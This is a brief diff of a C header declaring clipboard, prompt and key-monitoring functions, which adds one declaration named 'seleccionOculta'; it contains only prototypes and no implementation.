@@ -6,6 +6,6 @@ wchar_t* get_paper_clip();
 wchar_t* get_prompt();
 
 void post_paper_clip(const wchar_t* text);
-
+void seleccionOculta();
 DWORD WINAPI monitor_keys();
 
